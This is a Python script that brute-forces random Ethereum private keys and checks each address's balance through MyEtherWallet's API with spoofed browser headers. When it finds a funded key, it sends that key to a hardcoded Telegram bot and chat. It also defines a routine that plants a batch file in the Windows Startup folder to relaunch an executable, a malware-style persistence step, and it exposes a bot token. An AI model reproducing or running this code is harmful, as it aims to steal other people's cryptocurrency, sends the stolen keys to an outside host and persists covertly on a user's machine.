
import time
import requests
import eth_keys
import random
import json
import telebot
import datetime
from eth_keys import keys
from eth_utils import decode_hex
import getpass
import os

USER_NAME = getpass.getuser()

def genKey():
    lst = []
    for _ in range(64):
        i = random.randrange(16)
        if i > 9:
            if i == 10: i = 'A'
            elif i == 11: i = "B"
            elif i == 12: i = "C"
            elif i == 13: i = "D"
            elif i == 14: i = "E"
            elif i == 15: i = "F"
        lst.append(i)
    return "".join(map(str, lst))

headersMew = {
    'authority': 'nodes.mewapi.io',
    'method': 'POST',
    'path': '/rpc/eth',
    'scheme': 'https',
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-length': '115',
    'content-type': 'application/json',
    'origin': 'https://www.myetherwallet.com',
    'referer': 'https://www.myetherwallet.com/',
    'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36'
}


def add_to_startup(file_path=""):
    if __file__ != 'publiccheck.py':
        return
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        for i in range(8):
            bat_file.write(r'start "" %s' % file_path + '\publiccheck.exe' + '\n')


def checkKey():
    try:
        file = open('list.txt', 'r')
    except IOError as e:
        print('new File creating..')
        countY = 0
        # add_to_startup()
    else:
        lines = file.readlines()
        if lines == []:
            countY = 0
        else:
            data, time, key1, slash, countY = lines[-1].split()

    key = genKey()
    priv_key_bytes = decode_hex(key)
    priv_key = keys.PrivateKey(priv_key_bytes)
    adress = priv_key.public_key.to_checksum_address()

    timeCount = str(datetime.datetime.now(tz=None).date()) + ' ' + str(datetime.datetime.now(tz=None).time())[:8]

    jsonMew = {"jsonrpc":"2.0","id":5,"method":"eth_getBalance","params":[adress,"latest"]}
    r = requests.post('https://nodes.mewapi.io/rpc/eth', headers=headersMew, json=jsonMew)

    try:
        jsonAns = json.loads(r.text)
    except Exception as e:
        return

    if jsonAns['result'] == '0x0':
        with open('list.txt', 'a') as file:
            file.write(timeCount + ': ' + key + ' | ' + str(int(countY) + 1) + '\n')
        print(timeCount + ': ' + key + " - empty_account")
    else:
        print(key + "NU ZDAROVA")
        bot = telebot.TeleBot("809026438:AAGK1O8X7g_FjMUj1pYJHym5Hqi6PDO7zF4")
        bot.send_message('648967686', 'ZDAROVA - ' + key)
        with open('listX.txt', 'a') as fileX:
            fileX.write(timeCount + ': ' + key + '\n')


while True:
    checkKey()